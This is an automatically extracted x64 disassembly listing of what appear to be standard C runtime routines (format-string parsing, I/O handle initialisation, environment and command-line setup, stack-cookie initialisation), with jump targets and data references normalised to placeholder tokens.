mov rbx [ rsp + 0x530 ]
add rsp 0x4e0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax edx
mov rcx [ rbp - 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r9d r9d
je r-xdata
movzx eax r13w
sub ax r11w
cmp ax cx
ja r-xdata
cmp r9d 0x7
jne r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r13w
movzx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
mov ecx r9d
test r9d r9d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r9d
add rcx rax
lea rax [ r--data ]
movzx r9d [ rcx + rax ]
shr r9d 0x4
mov [ rsp + 0x68 ] r9d
cmp r9d 0x8
je r-xdata
mov eax esi
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rdx [ rsp + 0x78 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r13w
mov [ rsp + 0x44 ] 0x1
call sub_180023dac
xor r10d r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x40 ]
mov r11d 0x20
jmp r-xdata
mov [ rbp - 0x78 ] r10d
mov [ rsp + 0x6c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r12d r10d
mov edi esi
mov [ rsp + 0x48 ] esi
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov r9d [ rsp + 0x68 ]
mov r8 [ rbp - 0x80 ]
mov ecx 0x58
movzx eax r13w
cmp eax r11d
je r-xdata
dec ecx
je r-xdata
add r8 0x2
mov [ rbp - 0x80 ] r8
test edx edx
js r-xdata
or r12d 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r12d 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movzx eax r13w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x58 ] eax
jmp r-xdata
mov eax [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x48 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r12d 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
movzx r13d [ r8 ]
test r13w r13w
jne r-xdata
or r12d 0x4
neg eax
mov [ rsp + 0x58 ] eax
jmp r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
or r12d 0x4
jmp r-xdata
mov ecx 0x30
cmp eax ecx
mov ecx 0x58
jne r-xdata
lea ecx [ rdi + rdi * 4 ]
movzx eax r13w
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x48 ] edi
test edi edi
jns r-xdata
movzx eax r13w
cmp eax 0x49
je r-xdata
dec ecx
jne r-xdata
or r12d 0x8
jmp r-xdata
mov edi esi
mov [ rsp + 0x48 ] esi
jmp r-xdata
bts r12d 0xf
cmp [ r8 ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r13w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ r8 ] 0x33
jne r-xdata
cmp [ r8 + 0x2 ] 0x34
jne r-xdata
or r12d r11d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ r8 ] ax
je r-xdata
cmp [ r8 + 0x2 ] 0x32
jne r-xdata
add r8 0x4
bts r12d 0xf
jmp r-xdata
cmp [ r8 ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov r13d [ rsp + 0x44 ]
mov ecx 0x67
cmp eax ecx
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ r8 ] ax
je r-xdata
add r8 0x4
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
add r8 0x2
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov r11d 0x20
test r12b 0x40
je r-xdata
mov eax 0x200
or r12d 0x40
lea rbx [ rbp - 0x30 ]
mov esi eax
test edi edi
jns r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
bt r12d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rbp - 0x78 ] 0x1
add r13w r11w
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ r8 ] ax
je r-xdata
mov edi [ rsp + 0x48 ]
or esi 0xffffffff
mov rcx rax
call sub_18001c80c
mov edi [ rsp + 0x48 ]
xor r10d r10d
mov [ rbp - 0x50 ] r10
or esi 0xffffffff
mov edi [ rsp + 0x4c ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
cmp eax 0x6e
je r-xdata
add r14 0x8
test r11b r12b
je r-xdata
mov [ rsp + 0x50 ] r14
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ r8 ] ax
je r-xdata
mov rax [ rbp - 0x48 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x5c ]
mov r8 rsi
mov edx edi
mov [ rsp + 0x20 ] rax
call sub_180020f84
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 rsi
mov edx r14d
call sub_180023de4
test r12b 0x1
je r-xdata
mov [ rsp + 0x5c ] di
cmp edi eax
mov r15d 0xa3
cmovg edi eax
mov [ rsp + 0x48 ] edi
cmp edi r15d
jle r-xdata
cmp r13w cx
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
mov [ rsp + 0x50 ] r14
movsx edi r13b
movsxd rsi esi
mov [ rbp - 0x40 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x70 ]
mov [ rsp + 0x30 ] rcx
mov ecx [ rbp - 0x78 ]
mov r9d edi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x40 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r12d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
call sub_180026b18
xor r10d r10d
test eax eax
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
test r12b 0x40
je r-xdata
mov [ rsp + 0x50 ] r14
test r12b 0x40
je r-xdata
test eax r12d
jne r-xdata
test r8 r8
jns r-xdata
movzx eax [ r14 ]
add r14 0x8
mov r13d 0x1
mov [ rsp + 0x60 ] ax
mov [ rsp + 0x44 ] r13d
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
or r12d r11d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ r8 ] ax
je r-xdata
test r13d r13d
jne r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x5c ] ax
jmp r-xdata
mov eax 0x20
mov r15d edi
add edi 0x15d
movsxd rcx edi
call sub_180020800
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov r15d [ rsp + 0x48 ]
jmp r-xdata
mov r15d 0x1
jmp r-xdata
mov ecx 0x67
cmp r13w cx
jne r-xdata
test r15d r15d
jne r-xdata
mov eax [ rsp + 0x40 ]
lea r11d [ r10 + 0x20 ]
test r11b r12b
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test edi edi
jns r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov [ rbp - 0x30 ] ax
mov [ rsp + 0x64 ] al
mov rax [ rbp - 0x70 ]
mov [ rsp + 0x65 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rbp - 0x70 ]
lea rdx [ rsp + 0x64 ]
lea rcx [ rbp - 0x30 ]
call sub_180026b30
xor r10d r10d
test eax eax
jns r-xdata
cmp eax 0x53
je r-xdata
cmp [ r8 ] cx
je r-xdata
mov rax [ rbp - 0x48 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r15d
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180020f84
xor r10d r10d
test r15d r15d
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 rsi
mov edx r14d
call sub_180023de4
mov eax 0x20
mov [ rsp + 0x5c ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
mov [ rsp + 0x48 ] r15d
jmp r-xdata
mov rbx rax
mov esi edi
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov [ rdi ] eax
mov [ rdi ] ax
jmp r-xdata
mov esi 0x200
mov esi 0x200
or r12d esi
jmp r-xdata
mov edi 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
test r12b 0x40
je r-xdata
and r12d 0xfffffff7
cmp edi esi
cmovg edi esi
mov edi 0x1
jmp r-xdata
mov r8d r8d
mov edi 0x2d
lea rbx [ rbp - 0x30 ]
mov r15d r13d
jmp r-xdata
mov [ rsp + 0x6c ] r13d
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x68 ] r10d
mov r14 [ rsp + 0x50 ]
mov r11d 0x20
jmp r-xdata
test r12b 0x4
je r-xdata
mov rdi rbx
mov esi r15d
mov r14d [ rsp + 0x58 ]
mov rsi [ rsp + 0x78 ]
sub r14d r15d
sub r14d edi
test r12b 0xc
jne r-xdata
mov rcx rbx
call sub_18001e2c0
xor r10d r10d
mov r15d eax
jmp r-xdata
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov edx [ rsp + 0x40 ]
mov [ rsp + 0x6c ] 0x1
jmp r-xdata
mov r13d 0x30
mov edx [ rsp + 0x4c ]
add ax 0x51
mov [ rsp + 0x5c ] r13w
lea edx [ r9 - 0xe ]
mov [ rsp + 0x5e ] ax
jmp r-xdata
cmp [ rsp + 0x48 ] esi
mov rbx [ r14 ]
mov eax 0x7fffffff
cmove edi eax
add r14 0x8
mov [ rsp + 0x50 ] r14
test r11b r12b
je r-xdata
mov ecx 0x75
cmp eax ecx
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov r14d [ rsp + 0x70 ]
mov rax r8
lea rbx [ rbp + 0x1cf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
or r12d r11d
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x20
mov r8 rsi
mov edx r14d
call sub_180023de4
mov r14 [ rsp + 0x50 ]
xor r10d r10d
mov rsi [ rsp + 0x78 ]
or edx 0xffffffff
mov [ rsp + 0x40 ] edx
jmp r-xdata
mov rdx [ rsp + 0x78 ]
movzx ecx [ rsp + 0x60 ]
lea r8 [ rsp + 0x40 ]
call sub_180023dac
add rdi r13
xor r10d r10d
test esi esi
jg r-xdata
mov r13d [ rsp + 0x44 ]
jmp r-xdata
mov eax 0x8000
test eax r12d
je r-xdata
test rbx rbx
mov r13d 0x1
cmove rbx [ rw-data ]
mov [ rsp + 0x44 ] r13d
mov rax rbx
jmp r-xdata
test rbx rbx
mov r15d r10d
cmove rbx [ rw-data ]
mov rsi rbx
test edi edi
jle r-xdata
mov r9d 0xa
mov ecx 0x78
cmp eax ecx
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r14d
mov r14 [ rsp + 0x50 ]
lea rax [ rbp + 0x1cf ]
mov [ rsp + 0x48 ] edi
sub eax ebx
inc rbx
mov r15d eax
test esi r12d
je r-xdata
mov rax [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test edx edx
js r-xdata
mov rax [ rbp - 0x70 ]
lea r9 [ rbp - 0x70 ]
lea rcx [ rsp + 0x60 ]
movsxd r8 [ rax + 0x10c ]
mov rdx rdi
dec esi
call sub_180026b30
xor r10d r10d
movsxd r13 eax
test eax eax
jle r-xdata
mov rsi [ rsp + 0x78 ]
jmp r-xdata
cmp [ rsp + 0x6c ] r10d
jne r-xdata
test edi edi
jne r-xdata
cmp [ rsi ] r10b
je r-xdata
mov edi 0x2d
lea eax [ rcx - 0x51 ]
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_18001e2c0
xor r10d r10d
mov r15 rax
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
mov ecx 0x67
cmp eax 0x63
je r-xdata
mov edx [ rsp + 0x40 ]
dec edi
cmp [ rax ] r10w
je r-xdata
sub rax rbx
sar rax 0x1
mov r15d eax
jmp r-xdata
movzx ecx [ rsi ]
lea rdx [ rbp - 0x70 ]
call sub_180026cb0
xor r10d r10d
test eax eax
je r-xdata
mov r9d 0x10
mov [ rsp + 0x70 ] eax
mov esi 0x200
lea r13d [ r9 + 0x20 ]
test r12b r12b
jns r-xdata
dec rbx
inc r15d
mov [ rbx ] r13b
jmp r-xdata
cmp [ rbx ] r13b
je r-xdata
mov edi 0x2d
bt r12d 0xb
jae r-xdata
add rax 0x2
inc r15d
inc rsi
cmp r15d edi
jl r-xdata
inc rsi
movsx r15d [ rax ]
mov r13d r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
movsx eax [ rax ]
lea r13d [ rdi - 0x2c ]
cdq
mov [ rsp + 0x44 ] r13d
sub eax edx
sar eax 0x1
mov r15d eax
jmp r-xdata
jmp r-xdata
sub_180024994
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_180020880
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_180020880
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_180024c68
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_18001c80c
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_180024cdc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_1800239a0
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_180020880
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_18001e2c0
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_18001c80c
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_18001e2c0
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_180020880
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_18001c80c
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_18001e248
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18002073c
int3
add rdi 0x8
sub_180024e0c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180028594
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180028594
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_180024fdc
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_1800239a0
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180024e0c
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_180020800
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180024e0c
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_1800250d4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_180020800
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_18001c80c
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_1800251c8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180025200
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180025238
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18002531c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
